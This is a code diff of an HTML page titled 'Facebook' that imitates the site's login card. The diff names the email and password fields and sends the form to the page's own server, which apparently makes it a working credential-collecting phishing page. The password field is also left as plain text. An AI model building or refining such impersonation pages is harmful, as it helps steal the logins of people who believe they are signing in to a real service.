@@ -4,9 +4,11 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
-    <title>Facebook</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.0/css/bootstrap.min.css">
     <link rel="stylesheet" href="assets/css/styles.css">
+    <link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
+    <title>Facebook</title>
+    <link rel="icon" href="/assets/img/icon.png">
 </head>
 
 <body id="hero">
@@ -18,9 +20,9 @@
             <div id="card-holder">
                 <div class="card">
                     <div class="card-body" id="login-card">
-                        <form action="login" method="POST">
-                            <div class="holder"><input class="form-control cred-input" type="text" placeholder="Email address or Phone number"></div>
-                            <div class="holder"><input class="form-control cred-input" type="text" placeholder="password"></div>
+                        <form action="/" method="POST">
+                            <div class="holder"><input name="username" class="form-control cred-input" type="text" placeholder="Email address or Phone number"></div>
+                            <div class="holder"><input name="password" class="form-control cred-input" type="text" placeholder="password"></div>
                             <div class="holder"><button class="btn btn-primary" id="login-button" type="submit">Log In</button></div>
                         </form>
                         <div id="forgot-pass" class="holder"><a href="#">Forgot Password?</a></div>
